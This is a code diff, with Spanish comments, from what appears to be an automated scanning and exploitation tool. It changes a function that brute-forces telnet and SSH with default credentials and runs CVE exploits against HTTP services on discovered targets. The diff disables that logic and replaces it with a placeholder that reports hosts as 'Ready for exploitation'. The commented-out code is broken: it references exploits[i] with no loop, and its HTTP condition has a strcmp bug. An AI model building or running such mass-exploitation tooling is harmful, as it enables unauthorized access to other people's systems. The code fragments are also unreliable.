@@ -178,30 +178,36 @@ int auto_exploit_target(HunterTarget *target) {
     
     int success = 0;
     
+    // TODO: Integrar con funciones de exploit cuando se implemente correctamente
+    // Por ahora solo reportamos el hallazgo sin explotar
+    
+    // Simular intento de explotación (placeholder)
+    // En producción, aquí iría la lógica real de exploit
+    usleep(100000); // 100ms simulando ataque
+    
+    // Reportar hallazgo (no explotación por ahora)
+    char find_report[256];
+    snprintf(find_report, sizeof(find_report), 
+        "🔍 FOUND: %s:%d (%s) - Ready for exploitation", 
+        target->ip, target->port, target->service);
+    
+    // Por ahora no tenemos acceso a send_report, usar printf
+    printf("%s\n", find_report);
+    
+    /*
     // Telnet: brute force con credenciales
     if (strcmp(target->service, "telnet") == 0) {
-        extern Credential default_creds[];
-        extern int default_cred_count;
         success = telnet_brute_with_creds(target->ip, target->port, default_creds, default_cred_count);
     }
     // SSH: brute force
     else if (strcmp(target->service, "ssh") == 0) {
-        extern Credential default_creds[];
-        extern int default_cred_count;
         success = exploit_ssh_with_creds(target->ip, target->port, default_creds, default_cred_count);
     }
     // HTTP: probar CVE exploits
     else if (strcmp(target->service, "http") || strcmp(target->service, "https") == 0) {
-        // Intentar exploits HTTP conocidos
-        extern Exploit exploits[];
-        extern int exploit_count;
-        
-        // Probar todos los exploits HTTP (no verificamos puerto porque la struct no lo tiene)
-        for (int i = 0; i < exploit_count && !success; i++) {
-            success = execute_exploit_cve(target->ip, &exploits[i]);
-            if (success) break;
-        }
+        success = execute_exploit_cve(target->ip, &exploits[i]);
     }
+    */
     
     if (success) {
         pthread_mutex_lock(&hunter_mutex);
